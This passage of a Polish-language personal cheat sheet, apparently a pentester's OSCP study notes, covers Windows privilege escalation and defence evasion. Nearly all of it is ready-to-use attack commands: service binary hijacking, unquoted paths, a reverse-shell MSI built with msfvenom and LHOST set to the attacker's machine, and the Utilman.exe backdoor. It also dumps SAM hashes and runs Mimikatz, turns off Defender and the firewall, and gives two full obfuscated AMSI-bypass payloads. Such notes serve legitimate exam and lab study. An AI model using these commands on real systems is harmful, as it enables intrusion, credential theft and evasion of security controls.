powershell”  (start new proces)<br><strong>###Stworzenie nowego serwisu###</strong><br>#C:\Windows\System32\sc.exe create Scheduler binPath= „C:\Scheduler\scheduler.exe” #&gt; C:\Windows\System32\sc.exe delete Scheduler<br><strong>###PowerShell###</strong><br>#Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running’} (listowanie usług)<br><strong>###Sterowniki###</strong><br>#driverquery /v<br>#driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object‘Display Name’, ‘Start Mode’, Path<br>#Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like „VMware„} (wersje sterowników)<br><strong>###usługi###</strong><br>#szukanie nazwy serwisu: <mark style="background-color:#d2ffc8" class="has-inline-color">wmic service get name,displayname,pathname,startmode</mark><br>#net stop Serviio (zatrzymanie usługi) #&gt; możesz wtedy usunac binarke .exe wrzucic tutaj nowa exe (np. pobranie z Kaliego;mozliwe tez jak masz M modify) <br>#&gt; <mark style="background-color:#ffc9dd" class="has-inline-color">copy met.exe Servio.exe </mark>(podmiana pliku bez zmiany wlasciciela)<br>#&gt; net start Serviio    i masz rev-shell!!!<br>#cmd.exe /c sc qc KiteService (uruchamianie uslugi n. po podmianie .exe np. unquoted pah)  LUB   C:\Windows\system32\cmd.exe&gt;sc qc KiteService<br>#sc config KiteService binpath= „C:\program files\Kite\KiteService<strong>2</strong>.exe”  (proba podmiany sciezki do pliku)<br>#przydatne z <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation">hacktrick</a><br><strong>###inne###</strong><br>#systeminfo | findstr /B /C:”OS Name” /C:”OS Version” /C:”System Type”<br>#tasklist – lista procesów lub z mapowaniem do usług: tasklist /SVC<br>#Rejestr program: reg query i szukamy AlwaysInstallElevated na 1<br><strong>###sc###</strong><br>#sprawdzenie sc na innej maszynie: sc \DC01 queryex spooler<br><strong>##Tools###</strong><br>#Process Monitor: procmon.exe (opis <a href="https://3haker.pl/windows-privilege-escalation/">oscp</a> ) ale wymaga wg mnie uprawnien admina lokalnego !! lepszy jest procexp !!<br><strong>###Starting, Restarting and Stopping services in Powershell###</strong><br>#Start-Service $Nazwa_Serwis<br>#Stop-Service $Nazwa_Serwis<br>#Restart-Service $Nazwa_Serwis<br><strong>###Binary Hijacking###</strong><br>#icalcs „path” (F means full permission, we need to check we have full access on folder)<br>#ALTERNATYWNIE: .\accesschk64.exe -uwcqv „offsec” * -accepteula  (sprawdzeie do jakis serwis user offsec ma ALL ACCESS)<br>#sc stop $nazwa-serwis<br>#sc qc $nazwa-serwis (sprawdzanie jaka sciezke ma ten serwis)<br>#sc config $nazwa-serwis binpath= „C:\program files\Kite\KiteService<strong>2</strong>.exe” (proba podmiany scieki na inny .exe ktory stworzylismy)<br>#Trick na dodanie usera do Admina: sc config $nazwa-serwis binPath= „net localgroup administrators offsec /add”<br>#sc start $nazwa-serwis<br><strong>###Autorun###</strong><br>#reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run (find location i sprawdz czy mozesz nadpisac)<br>#reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run<br>#accesschk.exe \accepteula -wvu „$sciezka” (returns FILE_ALL_ACCESS ; Check the location is writable ; podmien i czekaj az sie Admin zaloguje)<br>#AutoRuns64.exe  (chyba sysinternals) do listowania programow<br>#–<br>#reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\<br>CurrentVersion\Run  (identyfikacja aplikacji Autorun)<br>#&gt; .\accesschk64.exe -wvu „c:\Program Files\ Jaki-Program”  (sprawdz prawa do wpisania do tego folderu ; nie umieszczaj pelnej sciezki do pliku exe tylko folder  ;  RW w wynikach oznacza Read &amp; Write Permission)<br>#&gt; Our custom Autorun program will be executed automatically the next time the administrator logs in<br><strong>###AlwaysInstallElevated (oznacza ze mozesz uzywac plików .msi – to pliki instalacyjne)###</strong><br>#—-For checking, it should return 1 or Ox1 !!! – chyba dla obydwu ponizszych a nie tylko dla jednego.<br>#reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br>#reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br>#msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=$PORT – -platform windows -f msi &gt; reverse.msi (Creating a reverseshell in msi format)<br>#&gt; wrzuc do C:\Temp lub C:\Windows\Temp<br>#&gt;msiexec /quiet /qn /i reverse.msi (lub z pelna sciezka: C:/temp/reverse.msi   ;   Execute and get shell)<br>#mozesz tez przez RDP po prostu kliknac progra aby uruchomic<br><strong>###Startup Apps###</strong><br>#C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp  (lista ; po podmianie pamietaj ze system musi sie zrestartowac  ;  moze masz prawa do folderu wtedy chyba cokolwiek met.exe wrzucisz tutaj)<br>#icacls „C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp”  (sprawdz czy masz full access do katalogu)<br><strong>###Insecure registry service###</strong><br>#winpeas da wynik dla jakies aplikacji: insecure registry service i poda nazwe tego serwis<br>#PS: Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl  (zobacz czy masz Allow Full Control)<br>#tworzy w msfvenon met.exe i wrzucamy do np. C:\Temp<br>#reg add „HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\<br>services\regsvc” /t REG_EXPAND_SZ /v ImagePath /d „C:\<br>Temp\met.exe” /f<br>#&gt; sc start regsvc<br><strong><mark style="background-color:#f8b5ff" class="has-inline-color">###oscp23###</mark></strong><br>#PS: Get-ItemProperty „HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*” | select displayname (aplikacje 32-bit)<br>#PS: Get-ItemProperty „HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*” | select displayname  (aplikacje 64 bit)<br>#Szukaj programów w C:\Program Files i folderach Donwloads<br>#PS: Get-Process (aktualnie trwające procesy ; szukaj: mysql, httpd, xampp) #&gt; Get-Process NAZWA_PROCESU -FileVersionInfo (wyświetli scieke do pliku)<br>#PS: $A = Get-Process (nowa linia) $A | Get-Process | Format-Table -View priority  (to podzieli procesy na priorytety, latwiej znalezc nietypowe)</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Windows_Service_by_oscp23" ez-toc-data-id="#Windows_Service_by_oscp23"></span>Windows Service by oscp23<span class="ez-toc-section-end"></span></h4>



<p>#zarządzanie przez Service Control Manager: Services snap-in, PowerShell, or the sc.exe<br>#– Service Binary Hijacking tł. przejecie usługi binarnej<br>#listowanie service: services.msc (GUI)<br>#PS: <mark style="background-color:#beffaf" class="has-inline-color">Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running’}</mark>   (lista ze statusem i ściezka ; ps. moze nie dzialac przez rev-shell ;  szukaj: apache, mysql  ; najwazniejsze te ze sciazka inna niz: C:\Windows\System32)<br>#&gt; sprawdzamy teraz nasze prawo do nadpisania binarki:<mark style="background-color:#b9ffa9" class="has-inline-color"> icacls „C:\xampp\apache\bin\httpd.exe”</mark>  (F Full access ; M Modify access ; RX Read and execute access ; R Read-only access ; W Write-only access)<br>#&gt; tworzymy plik adduser.c wg <a href="https://3haker.pl/kod-c-ktory-utworzy-nam-usera/">tego</a> kodu, ktory doda naszego user do administratora (lukasz / Password123!)<br>#&gt; przeyłanie exe z kaliego: iwr -uri http://$KALI:9090/adduser.exe -Outfile adduser.exe<br>#&gt; oryginalna binarke kopiujemy do siebie: move C:\xampp\mysql\bin\mysqld.exe mysqld.exe<br>#&gt; podmieniamy zlosliwa binarke: move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe<br>#&gt; restart usługi przez: net stop mysql (ale prawdopodobnie nie bedziemy mieli dostepu)<br>#&gt; sprawdzenie jak usluga sie wlacza: Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql’}  (Auto oznacza ze przy restarcie)<br>#&gt; sprawdzamy czy nasz user ma prawo do restartu (czy mamy SeShutDownPrivilege): whoami /priv (ważne czy ta pozycja jest w ogole na liscie, Disable nie jest wazne)  #&gt; shutdown /r /t 0<br>#&gt; po restarcie sprawdzamy czy jest nowy user; Get-LocalGroupMember administrators<br><strong>###PowerUp.ps1###</strong><br>#powershell -ep bypass #&gt; . .\PowerUp.ps1 (lub jak nie dziala to: Import-Module .\PowerUp.ps1) #&gt; Get-ModifiableServiceFile (pokaze binarki ktore mozemy modyfikowac, analogicznie do w/w recznych prac)<br>#&gt; można probowac atak na dany service: Install-ServiceBinary -Name 'mysql’ (bedzie error bo PowerUp nie radzi sobie jak trzeba uzyc argumentu do binarki)</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Uprawnienia" ez-toc-data-id="#Uprawnienia"></span>Uprawnienia<span class="ez-toc-section-end"></span></h4>



<p>!Jak znajdziesz coś do czego masz prawo to od razu zmień ustawienia na EVERYONE<br>#<mark style="background-color:#bbffac" class="has-inline-color">icacls „C:\Puppet”</mark> (sprawdzanie prawa zapisu do katalogu :błąd quotet path): <strong> </strong>(Puppet o tnazwa folderu, <strong><span style="text-decoration: underline;">pamiętaj aby nie było \</span></strong> )<br>#<strong><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls">icacls</a> legenda</strong>: I ; IO – oznacza dziedziczenie prawa z folderów wyżej ; F – Full access  ;  M- Modify access  ;  RX – Read and execute access ;; R – Read-only access  ;  W – Write-only access ; D – delete ; GA generic all<br>#icacls „C:\Program Files\Serviio\bin\ServiioService.exe” (sprawdzanie uprawnien do konkretnego programu)<br>#cd „C:\Program Files” (także: x86)) #&gt; <mark style="background-color:#ceffc3" class="has-inline-color">cmd.exe /c dir /a /o /q</mark> (by S1REN: możesz też sprawdzić np. Windows/Temp  ; /o to sortowanie  ;  /a wyswietla i katalogi i pliki  ; /q  wyswietla wlasciciela pliku )<br>#wyszukiwanie plików do <strong>nadpisania</strong>: Get-ChildItem „C:\Program Files” – Recurse | Get-ACL | ?{$_.AccessToString -match”Everyone\sAllow\s\sModify”}<br># w cmd: echo %path% – szukamy nietypowych folderów<br>#Get-ChildItem „C:\Program Files” – Recurse | Get-ACL | ?{$_.AccessToString -match „Everyone\sAllow\s\sModify”} (<a href="https://3haker.pl/privilege-escalation/">oscp</a>)<br>#accesschk.exe -uws „Everyone” „C:\Program Files” (szuka rekurencyjnie pliku lub katalogu z możliwością zapisu przez Everyone, <a href="https://3haker.pl/privilege-escalation/">oscp</a>)<br>#Szukaj plików które mają zapis EVERYONE i podmień je<br>#net user mój_user<br>#whoami /priv<br>#cd %TEMP%<br><strong>###Accesschk.exe###</strong><br>#accesschk.exe -uwqs Users c:*.* (Find ALL weak file permissions per drive)<br>#accesschk.exe -uwqs „Authenticated Users” c<em>:*.*</em> (you would be surprised if you have a real user, ale chyba Win 8)<br>#accesschk.exe -uws „Everyone” „C:\Program Files” (szuka programów z możliwością zapisu przez Everyone, <a href="https://3haker.pl/enumerating-readable-writable-files-and-directories/">oscp</a>)<br>#accesschk.exe -ucqv Spooler (sprawdzanie uprawnien dla usługi np. Spooler)<br>#accesschk.exe -dqv „C:\Python27” (spraawdzenie naszych uprawnień w konkretnym folderze)<br>#accesschk.exe -ucqv [service_name]<br>## Weak folder permision find:<br>#accesschk.exe -uwdqs Users c:\<br>#accesschk.exe -uwdqs „Authenticated Users” c:\ (byc bez c:)<br>#accesschk.exe -uwqs Users c:*.*<br>#accesschk.exe -uwqs „Authenticated Users” c:*.*<br>#accesschk.exe -uws „Everyone” „C:\Program Files”<br><strong>###sc###</strong><br>#sc config UPNPHOST binpath= „C:\Tools\sirenMaint.exe”<br>sc config UPNPHOST obj= „.\LocalSystem” password= „”<br>sc config SSDPSRV binpath= „C:\inetpub\siren\sirenMaint.exe”<br>sc config SSDPSRV obj= „.\LocalSystem” password= „”<br>sc config SSDPSRV start= „demand”<br>(Now, Stage matching msfvenom Payload Listener in Meterpreter)<br>net stop SSDPSRV<br>net start SSDPSRV<br><strong>###Próba podmiany pliku do którego mamy prawo###</strong><br>#takeown /f C:\Windows\System32\Utilman.exe<br>#icacls C:\Windows\System32\Utilman.exe /grant Everyone:F<br>#C:\Windows\System32&gt; copy cmd.exe utilman.exe<br>#&gt; Click the Ease of Access button on the logon screen to get a shell with NT Authority\System privileges.<br><strong>###Tools###</strong><br>#jak Watson wykryje CVE-2019-1388 to możesz eskalacja wg <a href="https://github.com/jas502n/CVE-2019-1388">github</a> i <a href="https://3haker.pl/udemy-kurs-active-directory/">opis</a> (bedziesz mógł dodac nowego usera jako lokalnego admina)</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Mount" ez-toc-data-id="#Mount"></span>Mount<span class="ez-toc-section-end"></span></h4>



<p>#/<a href="https://github.com/p1sc3s/Symlink-Tools-Compiled">CreateMountpoint</a>.exe zobacz <a href="https://3haker.pl/fish-practice/">lab</a> ;  .\CreateMountPoint.exe „C:\mount C:\Windows\System32” (folder mount stworz recznie)<br>#create share on Windows: NET SHARE = /remark: „This is my share.”<br>#mount windows share: NET USE Z: \ \COMPUTER_NAME\SHARE_NAME /PERSISTENT:YES<br>#unmount share:NET USE Z: /DELETE<br>#delete share całkowicie: NET SHARE /DELETE<br>#mountvol (listowanie zamontowanych dysków, w wynikach szukaj: No Mount Points)<br>#net share<br>#net use<br>#net share = /remark: „This is my share.” (CREATE A SHARE ON WINDOWS FROM THE COMMAND LINE)<br>#net use Z: \computer_name\share_name /PERSISTENT:YES (MOUNT A WINDOWS SHARE FROM THE COMMAND LINE)</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Passwords" ez-toc-data-id="#Passwords"></span>Passwords:<span class="ez-toc-section-end"></span></h4>



<p><strong>###SAM &amp; SYSTEM###</strong><br>#<strong>reg save HKLM\sam sam</strong> (musisz być elevated inaczej wygeneruje 0 bajt)<br>#<strong>reg save HKLM\system system </strong>(musisz być elevated inaczej wygeneruje 0 bajt)<br>#<mark style="background-color:#ffbec5" class="has-inline-color">secretsdump.py -sam SAM -system SYSTEM LOCAL</mark><br>#<mark style="background-color:#ffedb8" class="has-inline-color">samdump2 system sam</mark> (uruchom na Kali gdzie wrzucisz te 2 pliki, skopiuj całośc do hashes.txt ; kiedys mnie zawiodlo i nie pokazalo wszystkich hashy)<br>#secretsdump.py -ntds Plik.dit -system JakisPlik.bin LOCAL<br>#hashcat -m 1000 -a 3 hashes.txt rockyou.txt (bo 1000 jest dla NTLM)<br>#szukaj tez plików sam i system w C:\Windows\Repair\<br><strong>###Mimikatz###</strong><br>#powershell -ep bypass<br>#import-module .\Invoke-Mimikatz.ps1 <br>#Invoke-Mimikatz -Command <mark style="background-color:#b8ffa8" class="has-inline-color">'”privilege::debug” „token::elevate” „sekurlsa::logonpasswords” „lsadump::sam”</mark> „exit”’ (musisz być Lokalnym Administratorem ELEVATED!!!! (musisz Disabele Firewall i AV))<br>#Pobrane NTLM hashe łatwo łamie na <a href="https://crackstation.net/">https://crackstation.net/</a><br>#&gt;&gt;&gt; Przejdź do PTH<br><strong>###szukaj ###</strong><br>#szukanie pliku z danym rozszerzeniem na maszynie: PS: Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue<br>#najszybszy sposób szukania plików (<strong>musisz być w c:\</strong>): <strong><mark style="background-color:#bbffac" class="has-inline-color">dir /s /p proof.txt</mark></strong> (zamiast proof.txt moższ np. config.*, TYLKO w <strong>cmd</strong> dziala!  ;  /s szuka string rekurencyjnie ; /p to tylko stronicowanie wynikow  )<br>#szukanie w plikach config: dir /s pass == cred == vnc == .config (szukaj słów pass, cred, vnc z plikach .config)<br>#dir/s *.doc (szukanie wszystkich plikow .doc na maszynie)<br>#where /R C:\ user.txt (w cmd szukanie pliku o konkretnej nazwie, można też user.* albo user*)<br>#PS: REG QUERY HKLM /F „password” /t REG_SZ /S /K (szukanie w Rejestrze)<br>#PS: REG QUERY HKCU /F „password” /t REG_SZ /S /K<br>#Invoke-WindowsSearch.psm1 (do szukania słowa w indeksie Windows ; uruchom jako administrator; użycie: Invoke-WindowsSearch passwords ; redteam)<br><strong>###findstr###</strong><br>#findstr /spin „password” (/s szuka tego stringu, domyslenie dziala rekurencyjnie  ;   /p pomija pliki z niedrukowanymi znakami, /i to obojetnie jakie litery  ;  /n wyswietla numery linki w wynikach  ;; chyba obojetne czy jest cudzyslow czy nie ma)<br>#findstr /spin password *.doc *.txt *.ini *.config *.xml *.xls *.php *.asp *.aspx *.inf *.inc   (tylko w plikach z takich rozszerzeniem  ;  mozesz zamiast password dac pass)<br>#inne komendy szukaj na PayloadAllTheThings<br><strong>###Search for password in registry###</strong><br>#reg query HKLM /f password /t REG_SZ /s<br>#reg query HKCU /f password /t REG_SZ /s<br>#reg query „HKCU\Software\SimonTatham\PuTTY\Sessions\$USER” (szukanie credsów w sesji Putty, można zamienić na VNC)<br><strong>###Get-Childitem###</strong><br>#Get-ChildItem *.txt -Recurse -Force  (szukanie plików .txt resursywnie)<br><strong>###pliki###</strong><br>#C:\Users\\AppData\Roaming\Mozilla\Firefox\Profiles\xxxx.default<br>#C:\Users\alex\AppData\Roaming\Thunderbird\Profiles\jbv4ndsh.default- release\Mail\mail.sandbox.local\Inbox<br>#PS: gci -r | sls password | sls -NoMatch „falszywy1″,:flaszywy2” (redteam)<br>#(Get-PSReadlineOption).HistorySavePath (znajdz plik historii wiersza poleceń i przejrzyj go)<br>#zrzut trzymanych poświadczeń w Managerze Poświadczeń, kod PS <a href="https://3haker.pl/zrzut-poswiadczen-w-windows-kod-ps/">tutaj</a> (redteam)<br><strong>###PV###</strong><br>#Get-NetLoggedon -ComputerName client251<br>#Get-NetSession -ComputerName dc01<br><strong>###SouronEye.exe (by siddicky)###</strong><br>#<a href="https://github.com/vivami/SauronEye">github</a>, jest tez exe do pobrania<br>#wystarczy .\SouronEye.exe<br><strong><mark style="background-color:#ffa2fe" class="has-inline-color">###oscp23###</mark></strong><br>#PS: Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue<br>#PS: Get-ChildItem -Path C:\xampp -Include *<em>.txt,</em>*.ini -File -Recurse -ErrorAction SilentlyContinue (nie cały C tylko konkretny folder ; ciekawe: my.ini i passwords.txt)<br>#Get-ChildItem -Path C:\Users\USER_NAME\ -Include <em>*.txt,*</em>.pdf,*<em>.xls,*</em>.xlsx,*<em>.doc,*</em>.docx -File -Recurse -ErrorAction SilentlyContinue (szukanie nietypowych likow w folderze usera)<br>#—–<br>#Dobre polecenie do szukania wartosciowych plików:</p>



<pre class="wp-block-code"><code>Get-ChildItem -Path 'C:\' -File -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { $_.Extension -match '.(txt|pdf|xls|xlsx|doc|docx)$' }</code></pre>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Firewall" ez-toc-data-id="#Firewall"></span>Firewall:<span class="ez-toc-section-end"></span></h4>



<p><strong>###bezpieczne wykonywanie .ps1###</strong><br>#powershell -ep bypass -c „. .\PrivescCheck.ps1; Invoke-PrivescCheck” (z cd.exe) (bo to jest od powershell.exe -ExecutionPolicy Bypass ./ADAPE.ps1)<br>#Set-ExecutionPolicy Bypass -Scope process -Force #&gt; .\PrivescCheck.ps1<br>#Get-Content .\PrivescCheck.ps1 | Out-String | IEX<br>#iex(new-object system.net.webclient).downloadstring(“file:///C:\examplefile.ps1”) (nie wiem czy to samo pobranie czy pobranie z uruchomieniem??)<br>#<strong>powershell -ep bypass</strong> (czasami z cmd.exe) #&gt; .\PrivescCheck.ps1<br>#powershell.exe 'C:\Tools\privesc.ps1′<br>#Set-ExecutionPolicy Unrestricted ./file.ps1<br>#Import-Module script.psm1 Invoke-FunctionThatIsIntheModule<br>#powershell -ExecutionPolicy Bypass -File jakis.ps1<br>#PS: dir -Path C:\Users\LSobanski\Desktop\Moje\PurpleKnight-Community\PurpleKnight -Recurse | Unblock-File<br><strong>###Powershell###</strong><br>#powershell_ise<br>#Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser<br>#Set-ExecutionPolicy -ExecutionPolicy RemoteSigned<br>#$ExecPolicy = Get-ExecutionPolicy #&gt; Set-ExecutionPolicy bypass #&gt; .\ADRecon.ps1 #&gt; Set-ExecutionPolicy $ExecPolicy<br>#$Env:PSExecutionPolicyPreference = 'Bypass’<br><strong>###firewall – połaczenia przychodzące i wychodzące czy blok###</strong><br>#netsh firewall set opmode disable (turn off firewall, ale do wprowadzania zmian trzeba mieć wyższe uprawnienia – wróci tu po eskalacji)<br>#polityka firewall: netsh advfirewall show currentprofile; a tu reguły zapory jeżeli jest on: netsh advfirewall firewall show rule name=all<br>#netsh firewall show state (firewall information)<br>#netsh firewall show config (więcej informacji np. plik z logami)<br>#enable RDP: netsh firewall set service remoteadmin enable<br>#enable RDP 2: netsh firewall set service remotedesktop enable<br>#msf: post/windows/manage/enable_rdp<br>#PS: $f=New-object -comObject HNetCfg.FwPolicy2;$f.rules | where {$_.action -eq „0”} | select name,applicationname,localports (lista blokowanych portów na maszynie, jeżeli nic się nie pokaże to nie ma takich blokowanych)<br><strong>###firewall-trafic###</strong><br>#netsh advfirewall firewall show rule name=all (czasami z 'adv’ nie działa)<br>#netsh advfirewall firewall show rule name=inbound<br>#netsh advfirewall firewall show rule name=outbounD<br>#netsh advfirewall show domain (jest lokalizacja pliku z logami firewall, ale nie można go otworzyć jeżeli nie jest sie adminem)<br>#netsh advfirewall show private ; netsh advfirewall show public<br><strong>###enable RDP access###</strong><br>#reg add „hklm\system\currentcontrolset\control\terminal server” /f /v fDenyTSConnections /t REG_DWORD /d 0<br>#netsh firewall set service remoteadmin enable<br>#netsh firewall set service remotedesktop enable<br>#ps. genialnie tez działa: crackmapexec smb 172.16.207.11 -u joe -p Flowers1 -M rdp -o ACTION=enable<br><strong>###Check if Defender is enabled###</strong><br>#wejdź w opcje „Task Manager” &gt;Services i sprawdź czy Windows Defender jest na liście uruchomionych<br>#Get-MpComputerStatus<br>#Get-MpComputerStatus | Select IsTamperProtected,RealTimeProtectionEnabled | FL (Check if tamper  MANIPULOWANIE protection is enabled) (If Tamper protection is enabled you will not be able to turn off Defender by CMD or PowerShell)<br>#Set-MpPreference -DisableRealtimeMonitoring $true (Disables realtime monitoring, muszi być elev)<br>#Set-MpPreference -DisableIOAVProtection $true (Disables scanning for downloaded files or attachments)<br>#Add-MpPreference -ExclusionPath „C:\Windows\Temp” (Make exclusion for a certain folder)<br>#Set-MPPReference -DisableScriptScanning $true (Disables script scanning during malware scans)<br>#Set-MpPreference -ExclusionExtension „ps1” (Exclude files by extension)<br>#Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true;Add-MpPreference -ExclusionPath „C:\Windows\Temp” (Turn off everything and set exclusion to „C:\Windows\Temp”)<br><strong>#—ksiązka Priv Esc</strong><br>#sc query windefend  (jezeli jest jakis Error to pewnie oznacza że Defender jest wylaczony, jezeli poda wersje Win to jest wlaczony i dziala)<br>#sc queryex type=service  (to polecenie pokaze ci czy sa AV  ps. ale pokaze wiele innych serwisów)<br>#netsh firewall show state  (ogolny status firewall na maszynie)<br><strong>###Bypassing Windows firewalls.###</strong><br>##Win Vista, 7, 8, Server 2008, 10<br>#netsh advfirewall set allprofiles state off (ale trzeba być elevated)<br>#netsh advfirewall set currentprofile state off (też trzeba być elevated)<br>##Older Win, XP, Server 2003:<br>#netsh firewall set opmode mode=DISABLE<br><strong>###AppLocker###</strong><br>#Get-ApplockerPolicy -effective<br><strong>###BitDefender-taki AV Winowsa###</strong><br>#powershell -c „Add-MpPreference -ExclusionPath 'C:\Windows\Temp'” (wyłączenie folderu Temp ze skanowania, więc możemy tutaj upload złośliwe pliki)<br><strong><mark style="background-color:#f08bff" class="has-inline-color">###OSCP 23 <a href="https://3haker.pl/antivirus-evasion-by-oscp-23-yt/">lab</a>###</mark></strong><br>#sprawdz czy AV Enabled jest na True: Get-MpComputerStatus, możesz też w wyszukiwarce Windows szukać Windows Security<br>#python3 hoaxshell.py -s $KALI -r H „Authorization” (na Kalim generujemy payload revershell i przenosimy na Windows)<br>#&gt;AmsiTrigger_x64.exe -i .\test.ps1 (na Windows go sprawdzamy)<br>#&gt; trick polega na umieszczenie w poleceniu Windowsa 2x ’ np. zamiast iex damy ie”x<br>#&gt;wkleja kod PS do PS i uruchamia go uzyskując reverse-shell<br>#’amsiutils’ (polecenie sprawdza czy działa AMSI kiedy sa errory czy Amsi Bypass wylaczyl, wtedy bez errorow)<br>#sam znalazłem fajne yaploady do wyłączania AMSI <a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell">tutaj</a> i później sprawdz właśnie czy wyłączylo 'amsiutils’<br>#taki bypass przy użyciu PowerView ps. <strong>AMSI</strong> to Anti-MAlware-Script-Interpreter (więcej bypassów <a href="https://gist.github.com/reigningshells/a255fcca07465befbcbf4be9cdf67560">tutaj</a>):</p>



<pre class="wp-block-code"><code>sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )</code></pre>



<p>i podobno nowsza wersje powyższego</p>



<pre class="wp-block-code"><code>[ReF]."`A$(echo sse)`mB$(echo L)`Y"."g`E$(echo tty)p`E"(( "Sy{3}ana{1}ut{4}ti{2}{0}ils" -f'iUt','gement.A',"on.Am`s",'stem.M','oma') )."$(echo ge)`Tf`i$(echo El)D"(("{0}{2}ni{1}iled" -f'am','tFa',"`siI"),("{2}ubl{0}`,{1}{0}" -f 'ic','Stat','NonP'))."$(echo Se)t`Va$(echo LUE)"($(),$(1 -eq 1))</code></pre>



<p>#<a href="https://www.enigmaprotector.com/en/home.html">Enigma Protecton </a>podobno dobrze szyfruje pliki exe przed AV<br>#Metody wstrzykiwania do pamiec (pogoogluj): Remote Process Memory Injection i Reflective DLL Injection i Process Hollowing.<br>#Alternatywadla VirusTotal: <em>AntiScan.Me</em> – ps. ale on nie obsluguje .ps1<br>#Jeżeli stworzysz wlasna maszyne VM z Windows (do testów malware) to wylacz wysylanie probek do Microsoftu: Windows Security &gt; Virus &amp; threat protection &gt; Manage Settings &gt; Automatic Sample Submission na OFF<br>#<a href="https://3haker.pl/av-evasion-by-oscp23-powershell-memory/">Kod</a> powershell do AV Avasion by oscp23<br>#Kiedy blokowany jest .ps1 polityką: Get-ExecutionPolicy -Scope CurrentUser #&gt; Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser  #&gt; Get-ExecutionPolicy -Scope CurrentUser (teraz powinno być: Unrestricted) #&gt; teraz możemy uruchomic: ./bypass.ps1<br>#oscp poleca uzywanie tez tego on-line powershella <a href="https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py">github</a> użycie np. python ps_encoder.py -s default.ps1<br>#info z kursu o <a href="https://3haker.pl/antivirus-evasion-unikanie-av/">shellter</a> – na plikach exe: spotyfisetup lub putty<br>#oscp23 poleca też <a href="https://github.com/Veil-Framework/Veil">Veil</a>  ;  veil -t Evasion –list-payloads   ;  np. tworzenie .bat: veil -t Evasion -p powershell/meterpreter/rev_tcp.py –ip 192.168.45.211 –port 4444 (ps. .exe tworzysz z payloadami go/…)<br>#EBOWLA BYPASS AV POTATO EXPLOIT z <a href="https://github.com/Genetic-Malware/Ebowla">git</a></p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Unquoted_Path" ez-toc-data-id="#Unquoted_Path"></span>Unquoted Path<span class="ez-toc-section-end"></span></h4>



<p><em>Zasada: tak jakby w miejscu każdej spacji miało być: .exe</em>  Ps. jezeli sciezka nie jest w cydzysłowach ” „</p>



<p>#wmic service get name,displayname,pathname,startmode |findstr /i „auto” |findstr /i /v „c:\windows\” |findstr /i /v „””  (S!ren: z auto to działające usługi ; w cmd! i możesz ewentualnie usunc środkowy find aby pokazywało także w /windows/)<br>#sc query ; sc qc (szukaj wyników z „” lub spacjami)<br>#icacls „C:\Program Files (x86)\UNQUOTED_SERVICE_PATH_SOFTWARE”<br>#czy możesz coś wrzucić do C:\Program Files\<br>#czy możesz coś wrzucić do C:\Program Files\something\<br>#zmień C:\Program Files\something\something.exe na something.exe.BACK i wtedy wrzuć tu swój exe (np. <strong>ren</strong> C:\windows\system32\utilman.exe utilman.exe.bak) a przeniesienie przez polecenie copy.<br><strong>###sc###</strong><br>#sc qc<br>#sc qc WindowsScheduler<br>#sc stop WindowsScheduler<br>#sc start WindowsScheduler<br><strong>###icacls###</strong><br>#icacls .exe<br>#icacls C:\PROGRA~2\SYSTEM~1\.exe<br>#icacls C:\PROGRA~2\SYSTEM~1\.exe /grant Everyone:F<br><strong>###Steps###</strong><br>#1:Find unquoted service binpaths, for services run as ADMIN e.g. binpath= C:\Program Files\A bad folder\adminservice.exe<br>#2: Check if you have FULL/WRITE (F)(W) permissions along path using:<br>a) icacls „C:\Program Files\folder\A unquoted folder\adminservice.exe”<br>b) accesschk.exe -ucqv 